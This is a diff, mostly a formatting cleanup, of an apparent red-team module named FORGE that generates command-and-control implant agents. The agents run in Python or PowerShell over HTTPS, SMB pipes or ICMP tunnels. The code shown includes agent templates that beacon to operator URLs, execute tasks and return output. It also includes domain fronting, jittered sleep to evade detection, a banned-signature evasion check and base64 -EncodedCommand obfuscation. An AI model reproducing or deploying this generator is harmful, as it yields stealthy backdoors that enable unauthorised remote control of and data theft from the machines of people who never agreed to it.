@@ -19,6 +19,7 @@ Design constraints:
   - PowerShell agents obfuscated via -EncodedCommand when --obfuscate set.
   - Sleep masking scaffold included for Python and PowerShell agents.
 """
+
 from __future__ import annotations
 
 import base64
@@ -37,22 +38,17 @@ _LOG = logging.getLogger(__name__)
 
 # Evasion assertions — must not appear in generated agent output
 _BANNED_AGENT_SIGS: list[str] = [
-    "time.sleep(",     # Uniform sleep — must use gaussian_sleep wrapper
+    "time.sleep(",  # Uniform sleep — must use gaussian_sleep wrapper
     "REPLACE_BEFORE_DEPLOY",  # Key placeholder must be swapped before use
 ]
 
 # Channel fallback configuration
 _CHANNEL_FALLBACK_ORDER = ["https", "dns", "smb", "icmp"]
-_CHANNEL_FAILURE_THRESHOLDS = {
-    "https": 3,
-    "dns": 3, 
-    "smb": 2,
-    "icmp": 2
-}
+_CHANNEL_FAILURE_THRESHOLDS = {"https": 3, "dns": 3, "smb": 2, "icmp": 2}
 
 # ── Inline agent templates ────────────────────────────────────────────────────
 
-_PYTHON_HTTPS_AGENT = '''\
+_PYTHON_HTTPS_AGENT = """\
 # FORGE C2 Agent — Python HTTPS
 # Replace AES_KEY_HEX with a 32-byte key before deployment.
 # OPERATOR: verify front_domain CDN does not enforce SNI/Host consistency.
@@ -134,9 +130,9 @@ while True:
         except Exception as e:
             _send(str(e).encode())
     _gsleep(_INT, _SIG)
-'''
+"""
 
-_PS_HTTPS_AGENT = '''\
+_PS_HTTPS_AGENT = """\
 # FORGE C2 Agent — PowerShell HTTPS
 # Replace AES_KEY_HEX before deployment.
 $_C2   = @({c2_urls_ps})
@@ -166,20 +162,21 @@ foreach ($url in $_C2) {{
     }} catch {{ }}
     _GSleep
 }}
-'''
+"""
 
 
 # ── Agent config ────────────────────────────────────────────────────────────
 
+
 @dataclass
 class AgentBuild:
-    agent_type:  str
-    channel:     str
-    c2_urls:     list[str]
-    source:      str
-    session_id:  str
-    aes_key_hex: str          # placeholder value in source
-    obfuscated:  Optional[str] = None
+    agent_type: str
+    channel: str
+    c2_urls: list[str]
+    source: str
+    session_id: str
+    aes_key_hex: str  # placeholder value in source
+    obfuscated: Optional[str] = None
 
     @property
     def beacon_source(self) -> str:
@@ -191,6 +188,7 @@ class AgentBuild:
 
 
 # ── Generator ─────────────────────────────────────────────────────────────────
+
 
 class C2Generator:
     """
@@ -208,26 +206,27 @@ class C2Generator:
         )
         gen.save(build, output_path=Path("agent.py"))
     """
+
     _CHANNEL_FALLBACK_ORDER = _CHANNEL_FALLBACK_ORDER
     _CHANNEL_FAILURE_THRESHOLDS = _CHANNEL_FAILURE_THRESHOLDS
 
     def __init__(self, db_path: Path, engagement_id: int = 1) -> None:
-        self._db_path       = db_path
+        self._db_path = db_path
         self._engagement_id = engagement_id
 
     def generate(
         self,
-        agent_type:   Optional[str] = None,
-        channel:      str = "https",
-        c2_urls:      Optional[list[str]] = None,
-        interval:     int          = 300,
-        jitter_pct:   int          = 25,
+        agent_type: Optional[str] = None,
+        channel: str = "https",
+        c2_urls: Optional[list[str]] = None,
+        interval: int = 300,
+        jitter_pct: int = 25,
         front_domain: Optional[str] = None,
-        user_agent:   Optional[str] = None,
-        obfuscate:    bool          = False,
-        shell_type:   Optional[str] = None,
-        smb_config:   Optional[dict] = None,
-        icmp_config:  Optional[dict] = None,
+        user_agent: Optional[str] = None,
+        obfuscate: bool = False,
+        shell_type: Optional[str] = None,
+        smb_config: Optional[dict] = None,
+        icmp_config: Optional[dict] = None,
         enable_fallback: bool = True,
     ) -> AgentBuild:
         """Render agent source. Does NOT write to disk."""
@@ -252,74 +251,79 @@ class C2Generator:
                 f"No built-in template for agent={resolved_agent_type!r}, channel={channel!r}. "
                 "Supported: python/https, powershell/https, python/smb, python/icmp."
             )
-        
+
         # Validate channel-specific configurations
         if channel == "smb" and not smb_config:
             smb_config = self._get_default_smb_config()
         elif channel == "icmp" and not icmp_config:
             icmp_config = self._get_default_icmp_config()
-            
+
         ua = user_agent or (
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
             "AppleWebKit/537.36 (KHTML, like Gecko) "
             "Chrome/122.0.0.0 Safari/537.36"
         )
-        aes_key  = secrets.token_bytes(32).hex()
-        sess_id  = secrets.token_hex(16)
+        aes_key = secrets.token_bytes(32).hex()
+        sess_id = secrets.token_hex(16)
 
         if resolved_agent_type == "python" and channel in ("http", "https"):
             front_host_line = (
-                f"    'Host': '{c2_urls[0].split('//')[1].split('/')[0]}',"
-                if front_domain else ""
+                f"    'Host': '{c2_urls[0].split('//')[1].split('/')[0]}'," if front_domain else ""
             )
             source = _PYTHON_HTTPS_AGENT.format(
-                c2_urls       = c2_urls,
-                aes_key       = aes_key,
-                session_id    = sess_id,
-                interval      = interval,
-                jitter_pct    = jitter_pct,
-                user_agent    = ua,
-                front_host_header = front_host_line,
+                c2_urls=c2_urls,
+                aes_key=aes_key,
+                session_id=sess_id,
+                interval=interval,
+                jitter_pct=jitter_pct,
+                user_agent=ua,
+                front_host_header=front_host_line,
             )
 
         elif resolved_agent_type == "powershell" and channel in ("http", "https"):
             c2_ps = ", ".join(f'"{u}"' for u in c2_urls)
             source = _PS_HTTPS_AGENT.format(
-                c2_urls_ps  = c2_ps,
-                aes_key     = aes_key,
-                session_id  = sess_id,
-                interval    = interval,
-                jitter_pct  = jitter_pct,
-                user_agent  = ua,
+                c2_urls_ps=c2_ps,
+                aes_key=aes_key,
+                session_id=sess_id,
+                interval=interval,
+                jitter_pct=jitter_pct,
+                user_agent=ua,
             )
         elif channel == "smb":
-            source = self._generate_smb_agent(resolved_agent_type, smb_config, aes_key, sess_id, interval, jitter_pct)
+            source = self._generate_smb_agent(
+                resolved_agent_type, smb_config, aes_key, sess_id, interval, jitter_pct
+            )
         elif channel == "icmp":
-            source = self._generate_icmp_agent(resolved_agent_type, icmp_config, aes_key, sess_id, interval, jitter_pct)
+            source = self._generate_icmp_agent(
+                resolved_agent_type, icmp_config, aes_key, sess_id, interval, jitter_pct
+            )
 
         # Evasion assertion pass
         self._assert_no_banned_sigs(source, exclude_key_placeholder=True)
 
         obfuscated = None
         if obfuscate and resolved_agent_type == "powershell":
-            obfuscated = "powershell -EncodedCommand " + base64.b64encode(
-                source.encode("utf-16-le")
-            ).decode()
+            obfuscated = (
+                "powershell -EncodedCommand "
+                + base64.b64encode(source.encode("utf-16-le")).decode()
+            )
 
         return AgentBuild(
-            agent_type  = resolved_agent_type,
-            channel     = channel,
-            c2_urls     = c2_urls,
-            source      = source,
-            session_id  = sess_id,
-            aes_key_hex = aes_key,
-            obfuscated  = obfuscated,
+            agent_type=resolved_agent_type,
+            channel=channel,
+            c2_urls=c2_urls,
+            source=source,
+            session_id=sess_id,
+            aes_key_hex=aes_key,
+            obfuscated=obfuscated,
         )
 
     def save(self, build: AgentBuild, output_path: Path) -> None:
         """Write agent to disk after operator confirmation."""
         try:
             import questionary
+
             confirmed = questionary.confirm(
                 f"[Module 5-G] Write C2 agent:\n"
                 f"  Type   : {build.agent_type}\n"
@@ -356,10 +360,10 @@ class C2Generator:
     def _register_cleanup(path: Path) -> None:
         try:
             from forge.shared.cleanup import register_cleanup_file
+
             register_cleanup_file(path)
         except ImportError:
             pass
-
 
     def _get_default_smb_config(self) -> dict:
         """Get default SMB configuration."""
@@ -377,16 +381,23 @@ class C2Generator:
             "max_payload_size": 64,
         }
 
-    def _generate_smb_agent(self, agent_type: str, smb_config: dict, aes_key: str, 
-                           session_id: str, interval: int, jitter_pct: int) -> str:
+    def _generate_smb_agent(
+        self,
+        agent_type: str,
+        smb_config: dict,
+        aes_key: str,
+        session_id: str,
+        interval: int,
+        jitter_pct: int,
+    ) -> str:
         """Generate SMB channel agent code."""
         if agent_type != "python":
             raise ValueError(f"SMB channel only supports python agents, got {agent_type}")
-            
+
         pipe_name = smb_config.get("pipe_name", "atsvc")
         username = smb_config.get("username", "")
         domain = smb_config.get("domain", "")
-        
+
         return f'''# FORGE C2 Agent — Python SMB Named Pipe
 # Replace AES_KEY_HEX with a 32-byte key before deployment.
 import base64, json, os, random, time, struct
@@ -495,15 +506,22 @@ while True:
     _gsleep(_INT, _SIG)
 '''
 
-    def _generate_icmp_agent(self, agent_type: str, icmp_config: dict, aes_key: str,
-                            session_id: str, interval: int, jitter_pct: int) -> str:
+    def _generate_icmp_agent(
+        self,
+        agent_type: str,
+        icmp_config: dict,
+        aes_key: str,
+        session_id: str,
+        interval: int,
+        jitter_pct: int,
+    ) -> str:
         """Generate ICMP channel agent code."""
         if agent_type != "python":
             raise ValueError(f"ICMP channel only supports python agents, got {agent_type}")
-            
+
         target_ip = icmp_config.get("target_ip", "127.0.0.1")
         max_payload = icmp_config.get("max_payload_size", 64)
-        
+
         return f'''# FORGE C2 Agent — Python ICMP Echo Tunnel
 # Replace AES_KEY_HEX with a 32-byte key before deployment.
 import base64, json, os, random, time, struct, socket, os
@@ -652,6 +670,7 @@ while True:
     
     _gsleep(_INT, _SIG)
 '''
+
 
 def gaussian_sleep(
     interval: Optional[float] = None,
